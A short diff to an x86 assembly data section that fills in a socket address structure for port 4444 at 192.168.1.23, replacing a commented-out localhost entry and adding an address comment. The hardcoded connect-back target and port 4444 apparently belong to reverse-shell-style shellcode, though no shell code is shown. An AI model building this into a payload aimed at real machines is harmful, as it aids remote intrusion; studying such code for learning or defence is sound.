@@ -20,7 +20,7 @@ section .data
        dw 2             ; sin_family = AF_INET
        dw 0x5c11        ; sin_port = 4444 (port in network order: 0x115c → 0x5c11 in little-endian)
        ;dd 0x0100007f    ; sin_addr = 127.0.0.1 (0x7F000001)
-       dd 0x1701a8c0
+       dd 0x1701a8c0    ; 192.168.1.23
        times 8 db 0     ; sin_zero[8]
     server_addr_len equ 16
 
